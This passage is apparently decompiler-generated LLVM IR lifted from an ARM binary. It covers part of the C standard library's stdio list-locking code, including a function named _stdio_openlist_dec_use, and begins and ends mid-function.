  %v0_177ac = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_177ac = icmp eq i32 %v0_177ac, 0
  store i32 %v4_177a8, i32* %r8.global-to-local, align 4
  br i1 %v2_177ac, label %dec_label_pc_177b8, label %dec_label_pc_1782c

dec_label_pc_177b8:                               ; preds = %dec_label_pc_1779c
  %v0_177b8 = load i32, i32* @r7, align 4
  %v1_177b8 = add i32 %v0_177b8, 60
  %v2_177b8 = inttoptr i32 %v1_177b8 to i32*
  %v3_177b8 = load i32, i32* %v2_177b8, align 4
  %v1_177bc = add i32 %v3_177b8, -1
  store i32 %v1_177bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_177c0 = icmp eq i32 %v1_177bc, 0
  store i32 %v1_177bc, i32* %v2_177b8, align 4
  br i1 %v2_177c0, label %dec_label_pc_177cc, label %dec_label_pc_1782c

dec_label_pc_177cc:                               ; preds = %dec_label_pc_177b8
  %v0_177cc = load i32, i32* %r3.global-to-local, align 4
  %v1_177cc = load i32, i32* @r7, align 4
  %v2_177cc = add i32 %v1_177cc, 64
  %v3_177cc = inttoptr i32 %v2_177cc to i32*
  store i32 %v0_177cc, i32* %v3_177cc, align 4
  %v0_177d0 = load i32, i32* @r7, align 4
  %v1_177d0 = add i32 %v0_177d0, 56
  store i32 %v1_177d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_177d4

dec_label_pc_177d4:                               ; preds = %dec_label_pc_17804.dec_label_pc_177d4_crit_edge, %dec_label_pc_177cc
  %v0_177dc = phi i32 [ %v0_177dc.pre, %dec_label_pc_17804.dec_label_pc_177d4_crit_edge ], [ %v1_177d0, %dec_label_pc_177cc ]
  %v0_177d4 = phi i32 [ %v0_177d4.pre, %dec_label_pc_17804.dec_label_pc_177d4_crit_edge ], [ %v0_177d0, %dec_label_pc_177cc ]
  %v1_177d4 = add i32 %v0_177d4, 56
  %v2_177d4 = inttoptr i32 %v1_177d4 to i32*
  %v3_177d4 = load i32, i32* %v2_177d4, align 4
  store i32 %v3_177d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_177dc, i32* %r2.global-to-local, align 4
  %v1_177e024 = inttoptr i32 %v0_177dc to i32*
  %v2_177e025 = load i32, i32* %v1_177e024, align 4
  store i32 %v2_177e025, i32* %r3.global-to-local, align 4
  %v3_177e427 = icmp uge i32 %v2_177e025, %v3_177d4
  store i1 %v3_177e427, i1* %cpsr_c.global-to-local, align 1
  %v9_177e433 = icmp eq i32 %v2_177e025, %v3_177d4
  br i1 %v9_177e433, label %dec_label_pc_177ec, label %dec_label_pc_17804

dec_label_pc_177ec:                               ; preds = %dec_label_pc_177d4, %dec_label_pc_177ec.dec_label_pc_177e0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_177fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_177fc, label %dec_label_pc_17800, label %dec_label_pc_177ec.dec_label_pc_177e0_crit_edge

dec_label_pc_177ec.dec_label_pc_177e0_crit_edge:  ; preds = %dec_label_pc_177ec
  %v0_177e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_177e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_177e0 = inttoptr i32 %v0_177e0.pre to i32*
  %v2_177e0 = load i32, i32* %v1_177e0, align 4
  store i32 %v2_177e0, i32* %r3.global-to-local, align 4
  %v3_177e4 = icmp uge i32 %v2_177e0, %v1_177e4.pre
  store i1 %v3_177e4, i1* %cpsr_c.global-to-local, align 1
  %v9_177e4 = icmp eq i32 %v2_177e0, %v1_177e4.pre
  br i1 %v9_177e4, label %dec_label_pc_177ec, label %dec_label_pc_17804

dec_label_pc_17800:                               ; preds = %dec_label_pc_177ec
  %v0_17800 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17800, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17804

dec_label_pc_17804:                               ; preds = %dec_label_pc_177d4, %dec_label_pc_177ec.dec_label_pc_177e0_crit_edge, %dec_label_pc_17800
  %v0_1780c = phi i32 [ %v0_17800, %dec_label_pc_17800 ], [ %v2_177e025, %dec_label_pc_177d4 ], [ %v2_177e0, %dec_label_pc_177ec.dec_label_pc_177e0_crit_edge ]
  %v1_17804 = phi i32 [ %v0_17800, %dec_label_pc_17800 ], [ %v3_177d4, %dec_label_pc_177d4 ], [ %v1_177e4.pre, %dec_label_pc_177ec.dec_label_pc_177e0_crit_edge ]
  %v3_17804 = icmp uge i32 %v0_1780c, %v1_17804
  store i1 %v3_17804, i1* %cpsr_c.global-to-local, align 1
  %v9_17804 = icmp eq i32 %v0_1780c, %v1_17804
  br i1 %v9_17804, label %dec_label_pc_1780c, label %dec_label_pc_17804.dec_label_pc_177d4_crit_edge

dec_label_pc_17804.dec_label_pc_177d4_crit_edge:  ; preds = %dec_label_pc_17804
  %v0_177d4.pre = load i32, i32* @r7, align 4
  %v0_177dc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_177d4

dec_label_pc_1780c:                               ; preds = %dec_label_pc_17804
  %v2_1780c = icmp ne i32 %v1_17804, 0
  store i1 %v2_1780c, i1* %cpsr_c.global-to-local, align 1
  %v7_17810 = icmp slt i32 %v1_17804, 2
  br i1 %v7_17810, label %dec_label_pc_1782c, label %dec_label_pc_17814

dec_label_pc_17814:                               ; preds = %dec_label_pc_1780c
  %v0_17818 = load i32, i32* %r1.global-to-local, align 4
  %v1_17818 = add i32 %v0_17818, 129
  store i32 %v1_17818, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1782c

dec_label_pc_1782c:                               ; preds = %dec_label_pc_177b8, %dec_label_pc_1779c, %dec_label_pc_17814, %dec_label_pc_1780c
  %v0_1782c = load i32, i32* %r8.global-to-local, align 4
  %v2_17830 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17830, i32* %r4.global-to-local, align 4
  store i32 %v6_1771c, i32* @r5, align 4
  store i32 %v9_1771c, i32* @r6, align 4
  store i32 %v12_1771c, i32* @r7, align 4
  store i32 %v15_1771c, i32* @r8, align 4
  store i32 %v24_1771c, i32* @lr, align 4
  ret i32 %v0_1782c

; uselistorder directives
  uselistorder i32 %v0_17800, { 1, 0, 2 }
  uselistorder i32 %v1_177e4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_177a0, { 1, 0 }
  uselistorder i32 %v0_177a4, { 1, 0 }
  uselistorder i32 %v1_17760.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 12, 4, 5, 6, 7, 9, 8, 11, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 11, 12, 4, 5, 6, 8, 7, 0, 9, 10 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2, 5 }
  uselistorder label %dec_label_pc_1782c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_17804, { 2, 1, 0 }
  uselistorder label %dec_label_pc_177ec, { 1, 0 }
  uselistorder label %dec_label_pc_1779c, { 1, 0 }
  uselistorder label %dec_label_pc_17790, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_17780, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17768, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17838 = load i32, i32* @r4, align 4
  store i32 %v3_17838, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r5.global-to-local, align 4
  %v4_17848 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 160) to i32*), align 4
  store i32 %v4_17848, i32* %r7.global-to-local, align 4
  %v0_1784c = call i32 @__aeabi_read_tp()
  store i32 %v0_1784c, i32* %r0.global-to-local, align 4
  %v1_17850 = add i32 %v4_17848, 8
  %v2_17850 = inttoptr i32 %v1_17850 to i32*
  %v3_17850 = load i32, i32* %v2_17850, align 4
  store i32 %v3_17850, i32* %r3.global-to-local, align 4
  %v1_17854 = add i32 %v0_1784c, -1168
  store i32 %v1_17854, i32* %r6.global-to-local, align 4
  %v3_17858 = icmp uge i32 %v3_17850, %v1_17854
  store i1 %v3_17858, i1* %cpsr_c.global-to-local, align 1
  %v9_17858 = icmp eq i32 %v3_17850, %v1_17854
  br i1 %v9_17858, label %dec_label_pc_178a4, label %dec_label_pc_17864

dec_label_pc_17864:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17848, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1787093 = inttoptr i32 %v4_17848 to i32*
  %v2_1787094 = load i32, i32* %v1_1787093, align 4
  store i32 %v2_1787094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1787496 = icmp eq i32 %v2_1787094, 0
  br i1 %v9_1787496, label %dec_label_pc_1787c, label %dec_label_pc_17894

dec_label_pc_1787c:                               ; preds = %dec_label_pc_17864, %dec_label_pc_1787c.dec_label_pc_17870_crit_edge
  %v0_1787c97 = phi i32 [ %v1_17874.pre, %dec_label_pc_1787c.dec_label_pc_17870_crit_edge ], [ 0, %dec_label_pc_17864 ]
  store i32 %v0_1787c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1788c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1788c, label %dec_label_pc_17890, label %dec_label_pc_1787c.dec_label_pc_17870_crit_edge

dec_label_pc_1787c.dec_label_pc_17870_crit_edge:  ; preds = %dec_label_pc_1787c
  %v0_17870.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17874.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17870 = inttoptr i32 %v0_17870.pre to i32*
  %v2_17870 = load i32, i32* %v1_17870, align 4
  store i32 %v2_17870, i32* %r3.global-to-local, align 4
  %v3_17874 = icmp uge i32 %v2_17870, %v1_17874.pre
  store i1 %v3_17874, i1* %cpsr_c.global-to-local, align 1
  %v9_17874 = icmp eq i32 %v2_17870, %v1_17874.pre
  br i1 %v9_17874, label %dec_label_pc_1787c, label %dec_label_pc_17894

dec_label_pc_17890:                               ; preds = %dec_label_pc_1787c
  %v0_17890 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17890, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17894

dec_label_pc_17894:                               ; preds = %dec_label_pc_17864, %dec_label_pc_1787c.dec_label_pc_17870_crit_edge, %dec_label_pc_17890
  %v0_17894 = phi i32 [ %v0_17890, %dec_label_pc_17890 ], [ %v2_1787094, %dec_label_pc_17864 ], [ %v2_17870, %dec_label_pc_1787c.dec_label_pc_17870_crit_edge ]
  %v1_17894 = phi i32 [ %v0_17890, %dec_label_pc_17890 ], [ 0, %dec_label_pc_17864 ], [ %v1_17874.pre, %dec_label_pc_1787c.dec_label_pc_17870_crit_edge ]
  %v3_17894 = icmp uge i32 %v0_17894, %v1_17894
  store i1 %v3_17894, i1* %cpsr_c.global-to-local, align 1
  %v9_17894 = icmp eq i32 %v0_17894, %v1_17894
  br i1 %v9_17894, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_17894
  %v1_17898 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17898, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_17894, %bb
  %v1_1789c = xor i1 %v9_17894, true
  call void @__pseudo_cond_branch(i1 %v1_1789c, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_178a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_178a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_178a0 = add i32 %v1_178a0, 8
  %v3_178a0 = inttoptr i32 %v2_178a0 to i32*
  store i32 %v0_178a0, i32* %v3_178a0, align 4
  br label %dec_label_pc_178a4

dec_label_pc_178a4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_178a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_178a8 = add i32 %v0_178a8, 160
  %v3_178a8 = inttoptr i32 %v2_178a8 to i32*
  %v4_178a8 = load i32, i32* %v3_178a8, align 4
  store i32 %v4_178a8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_178b0 = add i32 %v0_178a8, 12
  %v3_178b0 = inttoptr i32 %v2_178b0 to i32*
  %v4_178b0 = load i32, i32* %v3_178b0, align 4
  store i32 %v4_178b0, i32* %r3.global-to-local, align 4
  %v1_178b4 = inttoptr i32 %v4_178b0 to i32*
  %v2_178b4 = load i32, i32* %v1_178b4, align 4
  store i32 %v2_178b4, i32* %r1.global-to-local, align 4
  %v1_178b8 = add i32 %v4_178a8, 4
  %v2_178b8 = inttoptr i32 %v1_178b8 to i32*
  %v3_178b8 = load i32, i32* %v2_178b8, align 4
  %v2_178bc = icmp ne i32 %v2_178b4, 0
  store i1 %v2_178bc, i1* %cpsr_c.global-to-local, align 1
  %v7_178bc = icmp eq i32 %v2_178b4, 1
  %v1_178c0 = add i32 %v3_178b8, 1
  store i32 %v1_178c0, i32* %r3.global-to-local, align 4
  store i32 %v1_178c0, i32* %v2_178b8, align 4
  br i1 %v7_178bc, label %dec_label_pc_178cc, label %dec_label_pc_17a30

dec_label_pc_178cc:                               ; preds = %dec_label_pc_178a4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_178d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_178d0 = add i32 %v0_178d0, 80
  %v3_178d0 = inttoptr i32 %v2_178d0 to i32*
  %v4_178d0 = load i32, i32* %v3_178d0, align 4
  store i32 %v4_178d0, i32* %r3.global-to-local, align 4
  %v1_178d4 = inttoptr i32 %v4_178d0 to i32*
  %v2_178d4 = load i32, i32* %v1_178d4, align 4
  store i32 %v2_178d4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_178d4, 1
  br i1 %tmp46, label %dec_label_pc_17a30, label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178cc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_178e4 = add i32 %v0_178d0, 152
  %v3_178e4 = inttoptr i32 %v2_178e4 to i32*
  %v4_178e4 = load i32, i32* %v3_178e4, align 4
  store i32 %v4_178e4, i32* %r7.global-to-local, align 4
  %v1_178e8 = add i32 %v4_178e4, 8
  %v2_178e8 = inttoptr i32 %v1_178e8 to i32*
  %v3_178e8 = load i32, i32* %v2_178e8, align 4
  store i32 %v3_178e8, i32* %r3.global-to-local, align 4
  %v1_178ec = load i32, i32* %r6.global-to-local, align 4
  %v3_178ec = icmp uge i32 %v3_178e8, %v1_178ec
  store i1 %v3_178ec, i1* %cpsr_c.global-to-local, align 1
  %v9_178ec = icmp eq i32 %v3_178e8, %v1_178ec
  br i1 %v9_178ec, label %dec_label_pc_17930, label %dec_label_pc_178f4

dec_label_pc_178f4:                               ; preds = %dec_label_pc_178e0
  store i32 %v4_178e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_178fc86 = inttoptr i32 %v4_178e4 to i32*
  %v2_178fc87 = load i32, i32* %v1_178fc86, align 4
  store i32 %v2_178fc87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1790089 = icmp eq i32 %v2_178fc87, 0
  br i1 %v9_1790089, label %dec_label_pc_17908, label %dec_label_pc_17920

dec_label_pc_17908:                               ; preds = %dec_label_pc_178f4, %dec_label_pc_17908.dec_label_pc_178fc_crit_edge
  %v0_1790890 = phi i32 [ %v1_17900.pre, %dec_label_pc_17908.dec_label_pc_178fc_crit_edge ], [ 0, %dec_label_pc_178f4 ]
  store i32 %v0_1790890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17918 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17918, label %dec_label_pc_1791c, label %dec_label_pc_17908.dec_label_pc_178fc_crit_edge

dec_label_pc_17908.dec_label_pc_178fc_crit_edge:  ; preds = %dec_label_pc_17908
  %v0_178fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17900.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_178fc = inttoptr i32 %v0_178fc.pre to i32*
  %v2_178fc = load i32, i32* %v1_178fc, align 4
  store i32 %v2_178fc, i32* %r3.global-to-local, align 4
  %v3_17900 = icmp uge i32 %v2_178fc, %v1_17900.pre
  store i1 %v3_17900, i1* %cpsr_c.global-to-local, align 1
  %v9_17900 = icmp eq i32 %v2_178fc, %v1_17900.pre
  br i1 %v9_17900, label %dec_label_pc_17908, label %dec_label_pc_17920

dec_label_pc_1791c:                               ; preds = %dec_label_pc_17908
  %v0_1791c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1791c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17920

dec_label_pc_17920:                               ; preds = %dec_label_pc_178f4, %dec_label_pc_17908.dec_label_pc_178fc_crit_edge, %dec_label_pc_1791c
  %v0_17920 = phi i32 [ %v0_1791c, %dec_label_pc_1791c ], [ %v2_178fc87, %dec_label_pc_178f4 ], [ %v2_178fc, %dec_label_pc_17908.dec_label_pc_178fc_crit_edge ]
  %v1_17920 = phi i32 [ %v0_1791c, %dec_label_pc_1791c ], [ 0, %dec_label_pc_178f4 ], [ %v1_17900.pre, %dec_label_pc_17908.dec_label_pc_178fc_crit_edge ]
  %v3_17920 = icmp uge i32 %v0_17920, %v1_17920
  store i1 %v3_17920, i1* %cpsr_c.global-to-local, align 1
  %v9_17920 = icmp eq i32 %v0_17920, %v1_17920
  br i1 %v9_17920, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_17920
  %v1_17924 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17924, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_17920, %bb47
  %v1_17928 = xor i1 %v9_17920, true
  call void @__pseudo_cond_branch(i1 %v1_17928, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_1792c = load i32, i32* %r6.global-to-local, align 4
  %v1_1792c = load i32, i32* %r7.global-to-local, align 4
  %v2_1792c = add i32 %v1_1792c, 8
  %v3_1792c = inttoptr i32 %v2_1792c to i32*
  store i32 %v0_1792c, i32* %v3_1792c, align 4
  %v0_17938.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17930

dec_label_pc_17930:                               ; preds = %dec_label_pc_178e0, %bb48
  %v0_17938 = phi i32 [ %v0_178d0, %dec_label_pc_178e0 ], [ %v0_17938.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_17938 = add i32 %v0_17938, 152
  %v3_17938 = inttoptr i32 %v2_17938 to i32*
  %v4_17938 = load i32, i32* %v3_17938, align 4
  store i32 %v4_17938, i32* %r0.global-to-local, align 4
  %v2_1793c = add i32 %v0_17938, 76
  %v3_1793c = inttoptr i32 %v2_1793c to i32*
  %v4_1793c = load i32, i32* %v3_1793c, align 4
  store i32 %v4_1793c, i32* %r2.global-to-local, align 4
  %v1_17940 = add i32 %v4_17938, 4
  %v2_17940 = inttoptr i32 %v1_17940 to i32*
  %v3_17940 = load i32, i32* %v2_17940, align 4
  store i32 %v3_17940, i32* %r3.global-to-local, align 4
  %v1_17944 = inttoptr i32 %v4_1793c to i32*
  %v2_17944 = load i32, i32* %v1_17944, align 4
  store i32 %v2_17944, i32* %r2.global-to-local, align 4
  %v1_17948 = add i32 %v3_17940, 1
  store i32 %v1_17948, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_17948, i32* %v2_17940, align 4
  %v0_17998.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1799811 = icmp eq i32 %v0_17998.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1799811, label %dec_label_pc_179a4, label %dec_label_pc_1795c

dec_label_pc_1795c:                               ; preds = %dec_label_pc_17930, %dec_label_pc_17994
  %v0_179802 = phi i32 [ %v0_17994, %dec_label_pc_17994 ], [ %v0_17998.pr, %dec_label_pc_17930 ]
  %v1_1795c = inttoptr i32 %v0_179802 to i16*
  %v2_1795c = load i16, i16* %v1_1795c, align 2
  %v3_1795c = zext i16 %v2_1795c to i32
  store i32 %v3_1795c, i32* %r3.global-to-local, align 4
  %v2_17960 = and i32 %v3_1795c, 32816
  store i32 %v2_17960, i32* %r1.global-to-local, align 4
  %v2_17964 = icmp ugt i32 %v2_17960, 47
  store i1 %v2_17964, i1* %cpsr_c.global-to-local, align 1
  %v7_17964 = icmp eq i32 %v2_17960, 48
  %v1_17968 = add i32 %v0_179802, 32
  %v2_17968 = inttoptr i32 %v1_17968 to i32*
  %v3_17968 = load i32, i32* %v2_17968, align 4
  store i32 %v3_17968, i32* %r4.global-to-local, align 4
  br i1 %v7_17964, label %dec_label_pc_17974, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1795c
  store i32 %v0_179802, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17994

dec_label_pc_17974:                               ; preds = %dec_label_pc_1795c
  %v0_17974 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17974 = icmp eq i32 %v0_17974, 0
  br i1 %v2_17974, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_17974
  %v1_17978 = load i32, i32* %r5.global-to-local, align 4
  %v2_17978 = load i32, i32* %r7.global-to-local, align 4
  %v3_17978 = add i32 %v2_17978, %v1_17978
  %v4_17978 = inttoptr i32 %v3_17978 to i32*
  %v5_17978 = load i32, i32* %v4_17978, align 4
  store i32 %v5_17978, i32* %r3.global-to-local, align 4
  %v3_1797c = inttoptr i32 %v5_17978 to i32*
  store i32 %v3_17968, i32* %v3_1797c, align 4
  %v0_17980 = load i32, i32* %r2.global-to-local, align 4
  %v1_17980 = inttoptr i32 %v0_17980 to i16*
  %v2_17980 = load i16, i16* %v1_17980, align 2
  %v3_17980 = zext i16 %v2_17980 to i32
  store i32 %v3_17980, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_17974
  %v2_179808 = load i16, i16* %v1_1795c, align 2
  %v3_179809 = zext i16 %v2_179808 to i32
  store i32 %v3_179809, i32* %r3.global-to-local, align 4
  %v3_17984 = add i32 %v0_17974, 32
  %v4_17984 = inttoptr i32 %v3_17984 to i32*
  store i32 %v3_17968, i32* %v4_17984, align 4
  %v0_17988.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_17988 = phi i32 [ %v3_17980, %.thread ], [ %v0_17988.pre, %bb49 ]
  %v1_17988 = and i32 %v0_17988, 8192
  %v2_17988 = icmp eq i32 %v1_17988, 0
  br i1 %v2_17988, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1798c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1798c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_17990 = xor i1 %v2_17988, true
  call void @__pseudo_cond_branch(i1 %v1_17990, i32 ptrtoint (i32* @global_var_14284.33 to i32))
  %v0_17994.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17994

dec_label_pc_17994:                               ; preds = %.thread38, %bb52
  %v0_17994 = phi i32 [ %v0_17994.pre, %bb52 ], [ %v3_17968, %.thread38 ]
  store i32 %v0_17994, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17998 = icmp eq i32 %v0_17994, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_17998, label %dec_label_pc_179a4, label %dec_label_pc_1795c

dec_label_pc_179a4:                               ; preds = %dec_label_pc_17994, %dec_label_pc_17930
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_179a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_179a8 = add i32 %v0_179a8, 152
  %v3_179a8 = inttoptr i32 %v2_179a8 to i32*
  %v4_179a8 = load i32, i32* %v3_179a8, align 4
  store i32 %v4_179a8, i32* %r0.global-to-local, align 4
  %v1_179ac = add i32 %v4_179a8, 4
  %v2_179ac = inttoptr i32 %v1_179ac to i32*
  %v3_179ac = load i32, i32* %v2_179ac, align 4
  %v1_179b0 = add i32 %v3_179ac, -1
  store i32 %v1_179b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_179b4 = icmp eq i32 %v1_179b0, 0
  store i32 %v1_179b0, i32* %v2_179ac, align 4
  br i1 %v2_179b4, label %dec_label_pc_179c0, label %dec_label_pc_17a20

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179a4
  %v0_179c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_179c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_179c0 = add i32 %v1_179c0, 8
  %v3_179c0 = inttoptr i32 %v2_179c0 to i32*
  store i32 %v0_179c0, i32* %v3_179c0, align 4
  %v0_179c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_179c4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_179c8

dec_label_pc_179c8:                               ; preds = %dec_label_pc_179f8.dec_label_pc_179c8_crit_edge, %dec_label_pc_179c0
  %v0_179c8 = phi i32 [ %v0_179c8.pre, %dec_label_pc_179f8.dec_label_pc_179c8_crit_edge ], [ %v0_179c4, %dec_label_pc_179c0 ]
  %v1_179c8 = inttoptr i32 %v0_179c8 to i32*
  %v2_179c8 = load i32, i32* %v1_179c8, align 4
  store i32 %v2_179c8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_179c8, i32* %r2.global-to-local, align 4
  %v2_179d474 = load i32, i32* %v1_179c8, align 4
  store i32 %v2_179d474, i32* %r3.global-to-local, align 4
  %v3_179d876 = icmp uge i32 %v2_179d474, %v2_179c8
  store i1 %v3_179d876, i1* %cpsr_c.global-to-local, align 1
  %v9_179d882 = icmp eq i32 %v2_179d474, %v2_179c8
  br i1 %v9_179d882, label %dec_label_pc_179e0, label %dec_label_pc_179f8

dec_label_pc_179e0:                               ; preds = %dec_label_pc_179c8, %dec_label_pc_179e0.dec_label_pc_179d4_crit_edge
  %v0_179e083 = phi i32 [ %v1_179d8.pre, %dec_label_pc_179e0.dec_label_pc_179d4_crit_edge ], [ %v2_179c8, %dec_label_pc_179c8 ]
  store i32 %v0_179e083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_179f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_179f0, label %dec_label_pc_179f4, label %dec_label_pc_179e0.dec_label_pc_179d4_crit_edge

dec_label_pc_179e0.dec_label_pc_179d4_crit_edge:  ; preds = %dec_label_pc_179e0
  %v0_179d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_179d8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_179d4 = inttoptr i32 %v0_179d4.pre to i32*
  %v2_179d4 = load i32, i32* %v1_179d4, align 4
  store i32 %v2_179d4, i32* %r3.global-to-local, align 4
  %v3_179d8 = icmp uge i32 %v2_179d4, %v1_179d8.pre
  store i1 %v3_179d8, i1* %cpsr_c.global-to-local, align 1
  %v9_179d8 = icmp eq i32 %v2_179d4, %v1_179d8.pre
  br i1 %v9_179d8, label %dec_label_pc_179e0, label %dec_label_pc_179f8

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179e0
  %v0_179f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_179f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179f8

dec_label_pc_179f8:                               ; preds = %dec_label_pc_179c8, %dec_label_pc_179e0.dec_label_pc_179d4_crit_edge, %dec_label_pc_179f4
  %v0_17a00 = phi i32 [ %v0_179f4, %dec_label_pc_179f4 ], [ %v2_179d474, %dec_label_pc_179c8 ], [ %v2_179d4, %dec_label_pc_179e0.dec_label_pc_179d4_crit_edge ]
  %v1_179f8 = phi i32 [ %v0_179f4, %dec_label_pc_179f4 ], [ %v2_179c8, %dec_label_pc_179c8 ], [ %v1_179d8.pre, %dec_label_pc_179e0.dec_label_pc_179d4_crit_edge ]
  %v3_179f8 = icmp uge i32 %v0_17a00, %v1_179f8
